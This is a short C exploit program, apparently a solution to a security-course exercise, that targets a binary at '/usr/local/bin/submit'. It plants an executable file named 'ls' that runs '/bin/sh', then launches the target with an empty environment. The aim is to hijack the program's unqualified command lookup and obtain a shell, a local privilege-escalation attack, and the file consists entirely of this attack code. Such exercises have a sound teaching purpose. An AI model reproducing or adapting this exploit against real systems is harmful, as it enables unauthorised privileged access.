/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  char *args[4];
  char *env[1];
  FILE *f;

  f = fopen("ls", "w");
  fprintf(f, "/bin/sh\n");
  fclose(f);

  chmod("ls", S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH);


  args[0] = "blah"; 
  args[1] = "blah"; 
  args[2] = "blah"; 
  args[3] = NULL;

  env[0] = NULL; 

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
